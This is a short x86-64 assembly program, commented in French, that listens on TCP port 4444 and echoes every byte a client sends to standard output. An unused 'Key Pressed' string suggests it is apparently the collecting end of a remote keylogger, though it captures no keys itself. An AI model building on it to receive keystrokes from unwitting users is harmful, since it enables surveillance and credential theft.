section .bss
    socket resq 1
    client_socket resq 1
    server resb 16
    key_buffer resb 1

section .data
    port dw 4444
    msg db "Key Pressed: ", 0

section .text
    global _start

_start:
    ; 1. Créer un socket
    mov rax, 41  ; syscall socket
    mov rdi, 2   ; AF_INET
    mov rsi, 1   ; SOCK_STREAM
    mov rdx, 0   ; IPPROTO_IP
    syscall
    mov [socket], rax

    ; 2. Bind l'adresse du serveur
    mov word [server], 2     ; AF_INET
    mov word [server+2], 0x5c11 ; Port 4444
    mov dword [server+4], 0x00000000 ; 0.0.0.0 (écoute toutes les IPs)

    mov rax, 49  ; syscall bind
    mov rdi, [socket]
    lea rsi, [server]
    mov rdx, 16
    syscall

    ; 3. Écoute sur le port
    mov rax, 50  ; syscall listen
    mov rdi, [socket]
    mov rsi, 10  ; max clients en attente
    syscall

accept_loop:
    ; 4. Accepter une connexion
    mov rax, 43  ; syscall accept
    mov rdi, [socket]
    mov rsi, 0
    mov rdx, 0
    syscall
    mov [client_socket], rax  ; Stocke le socket client

read_loop:
    ; 5. Lire une touche
    mov rax, 0
    mov rdi, [client_socket]
    mov rsi, key_buffer
    mov rdx, 1
    syscall

    cmp rax, 0
    jle accept_loop

    mov rax, 1
    mov rdi, 1
    mov rsi, key_buffer
    mov rdx, 1
    syscall

    jmp read_loop
